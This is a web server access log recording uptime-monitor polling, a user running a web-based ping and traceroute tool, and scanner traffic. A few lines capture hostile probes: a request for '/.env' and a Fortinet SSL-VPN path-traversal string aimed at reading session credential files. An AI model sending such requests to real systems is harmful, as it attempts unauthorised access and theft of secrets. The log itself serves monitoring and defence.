98.101.191.8 - - [16/Dec/2023:06:58:25 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 1352 "livetrace@docker" "http://172.29.0.3:80" 0ms
98.101.191.8 - - [16/Dec/2023:06:58:27 +0000] "GET /trace/ HTTP/2.0" 200 4079 "-" "-" 1353 "livetrace@docker" "http://172.29.0.3:80" 4ms
98.101.191.8 - - [16/Dec/2023:06:58:30 +0000] "GET /trace/ HTTP/2.0" 200 4079 "-" "-" 1354 "livetrace@docker" "http://172.29.0.3:80" 4ms
107.170.232.47 - - [16/Dec/2023:06:58:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1355 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:06:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1356 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:06:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1357 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:06:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1358 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1359 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1360 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1361 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1362 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1363 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1364 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1365 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1366 "www@docker" "http://172.29.0.8:80" 0ms
54.36.115.221 - - [16/Dec/2023:07:03:40 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1367 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:07:03:40 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1368 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1369 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1370 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1371 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1372 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1373 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1374 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1375 "www@docker" "http://172.29.0.8:80" 0ms
98.101.191.8 - - [16/Dec/2023:07:07:24 +0000] "GET /trace/ HTTP/2.0" 200 4079 "-" "-" 1376 "livetrace@docker" "http://172.29.0.3:80" 4ms
167.71.120.76 - - [16/Dec/2023:07:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1377 "www@docker" "http://172.29.0.8:80" 0ms
98.101.191.8 - - [16/Dec/2023:07:07:40 +0000] "GET /trace/ HTTP/2.0" 200 4079 "-" "-" 1378 "livetrace@docker" "http://172.29.0.3:80" 4ms
173.48.140.140 - - [16/Dec/2023:07:08:03 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 1379 "livetrace@docker" "http://172.29.0.3:80" 7ms
173.48.140.140 - - [16/Dec/2023:07:08:07 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 1380 "livetrace@docker" "http://172.29.0.3:80" 4ms
173.48.140.140 - - [16/Dec/2023:07:08:11 +0000] "GET /trace/startping.php?id=2fxvyidbp HTTP/2.0" 200 105 "-" "-" 1381 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:11 +0000] "GET /trace/starttrace.php?id=ey7lkceuu HTTP/2.0" 200 106 "-" "-" 1382 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:12 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 90 "-" "-" 1383 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:12 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 658 "-" "-" 1384 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:13 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 89 "-" "-" 1385 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:13 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 658 "-" "-" 1386 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:14 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 91 "-" "-" 1387 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:14 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 658 "-" "-" 1388 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:15 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 90 "-" "-" 1389 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:15 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 681 "-" "-" 1390 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:16 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 681 "-" "-" 1391 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:16 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 91 "-" "-" 1392 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:17 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 91 "-" "-" 1393 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:17 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 681 "-" "-" 1394 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:18 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 90 "-" "-" 1395 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:18 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 683 "-" "-" 1396 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:19 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 683 "-" "-" 1398 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:19 +0000] "GET /trace/pollping.php?id=2fxvyidbp HTTP/2.0" 200 99 "-" "-" 1397 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:08:19 +0000] "GET /trace/cleanping.php?id=2fxvyidbp HTTP/2.0" 200 71 "-" "-" 1399 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:07:08:20 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 683 "-" "-" 1400 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:21 +0000] "GET /trace/polltrace.php?id=ey7lkceuu HTTP/2.0" 200 936 "-" "-" 1401 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:08:21 +0000] "GET /trace/cleantrace.php?id=ey7lkceuu HTTP/2.0" 200 72 "-" "-" 1402 "livetrace@docker" "http://172.29.0.3:80" 3ms
159.203.109.206 - - [16/Dec/2023:07:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1403 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1404 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:07:08:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1405 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1406 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1407 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:10:01 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 1408 "livetrace@docker" "http://172.29.0.3:80" 5ms
159.203.109.206 - - [16/Dec/2023:07:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1409 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1410 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1411 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1412 "www@docker" "http://172.29.0.8:80" 0ms
91.92.243.151 - - [16/Dec/2023:07:12:14 +0000] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 19 "-" "-" 1413 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1414 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1415 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1416 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1417 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [16/Dec/2023:07:14:21 +0000] "GET /trace/ HTTP/2.0" 200 4085 "-" "-" 1418 "livetrace@docker" "http://172.29.0.3:80" 7ms
159.203.109.206 - - [16/Dec/2023:07:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1419 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [16/Dec/2023:07:14:28 +0000] "GET /trace/startping.php?id=eb8elfl5u HTTP/2.0" 200 105 "-" "-" 1420 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:28 +0000] "GET /trace/starttrace.php?id=pj8x2ob58 HTTP/2.0" 200 106 "-" "-" 1421 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:07:14:29 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1423 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:29 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 89 "-" "-" 1422 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:30 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 89 "-" "-" 1424 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:30 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1425 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:31 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 91 "-" "-" 1427 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:31 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1426 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:32 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 91 "-" "-" 1428 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:32 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1429 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:33 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1430 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:33 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 90 "-" "-" 1431 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:34 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 90 "-" "-" 1432 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:34 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1433 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:35 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 90 "-" "-" 1434 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:35 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1435 "livetrace@docker" "http://172.29.0.3:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1436 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:36 +0000] "GET /trace/pollping.php?id=eb8elfl5u HTTP/2.0" 200 99 "-" "-" 1437 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:36 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1438 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:37 +0000] "GET /trace/cleanping.php?id=eb8elfl5u HTTP/2.0" 200 71 "-" "-" 1439 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:07:14:37 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1440 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:38 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 80 "-" "-" 1441 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:39 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1442 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:41 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1443 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:42 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1444 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:43 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1445 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:44 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1446 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:45 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1447 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:46 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1448 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:47 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1449 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:48 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1450 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:49 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 147 "-" "-" 1451 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:50 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 688 "-" "-" 1452 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:51 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 688 "-" "-" 1453 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:52 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 688 "-" "-" 1454 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:53 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 711 "-" "-" 1455 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:54 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 711 "-" "-" 1456 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:55 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 711 "-" "-" 1457 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:56 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 713 "-" "-" 1458 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:57 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 713 "-" "-" 1459 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:07:14:58 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 713 "-" "-" 1460 "livetrace@docker" "http://172.29.0.3:80" 2ms
143.110.222.166 - - [16/Dec/2023:07:14:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1461 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [16/Dec/2023:07:14:59 +0000] "GET /trace/polltrace.php?id=pj8x2ob58 HTTP/2.0" 200 964 "-" "-" 1462 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:07:14:59 +0000] "GET /trace/cleantrace.php?id=pj8x2ob58 HTTP/2.0" 200 72 "-" "-" 1463 "livetrace@docker" "http://172.29.0.3:80" 3ms
159.203.109.206 - - [16/Dec/2023:07:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1464 "www@docker" "http://172.29.0.8:80" 0ms
173.48.140.140 - - [16/Dec/2023:07:15:27 +0000] "GET /trace/ HTTP/2.0" 200 4085 "-" "-" 1465 "livetrace@docker" "http://172.29.0.3:80" 4ms
167.71.120.76 - - [16/Dec/2023:07:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1466 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1467 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1468 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1469 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1470 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1471 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1472 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1473 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1474 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1475 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1476 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1477 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1478 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1479 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1480 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1481 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1482 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1483 "www@docker" "http://172.29.0.8:80" 0ms
116.58.51.90 - - [16/Dec/2023:07:24:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1484 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:07:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1485 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1486 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1487 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1488 "www@docker" "http://172.29.0.8:80" 1ms
64.62.197.166 - - [16/Dec/2023:07:26:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1489 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:07:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1490 "www@docker" "http://172.29.0.8:80" 0ms
90.151.171.106 - - [16/Dec/2023:07:26:48 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1491 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [16/Dec/2023:07:26:58 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1492 "web-to-websecure@internal" "-" 0ms
94.124.161.102 - - [16/Dec/2023:07:27:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1493 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1494 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1495 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1496 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1497 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1498 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1499 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1500 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1501 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1502 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1503 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:07:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1504 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:07:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1505 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.166 - - [16/Dec/2023:07:33:19 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1506 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1507 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1508 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.152 - - [16/Dec/2023:07:34:13 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 1509 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:07:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1510 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.157 - - [16/Dec/2023:07:34:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1511 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:07:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1512 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:07:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1513 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:07:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1514 "www@docker" "http://172.29.0.8:80" 0ms
64.62.197.160 - - [16/Dec/2023:07:35:58 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 1515 "-" "-" 0ms
